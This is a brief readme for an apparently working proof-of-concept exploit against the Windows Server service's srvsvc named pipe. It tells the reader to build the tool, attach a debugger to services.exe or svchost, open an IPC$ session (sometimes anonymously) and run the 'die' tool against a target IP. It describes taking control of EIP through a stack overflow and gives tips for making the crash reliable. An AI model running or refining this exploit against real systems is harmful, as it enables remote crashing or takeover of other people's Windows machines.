In vstudio command prompt:

  mk.bat

next:

  attach debugger to services.exe (2k) or the relevant svchost (xp/2k3/...)

  net use \\IPADDRESS\IPC$ /user:user creds
  die \\IPADDRESS \pipe\srvsvc

  In some cases, /user:"" "", will suffice (i.e., anonymous connection)

You should get EIP -> 00 78 00 78, a stack overflow (like a guard page
violation), access violation, etc.  However, in some cases, you will get
nothing.

This is because it depends on the state of the stack prior to the "overflow".
You need a slash on the stack prior to the input buffer.

So play around a bit, you'll get it working reliably...
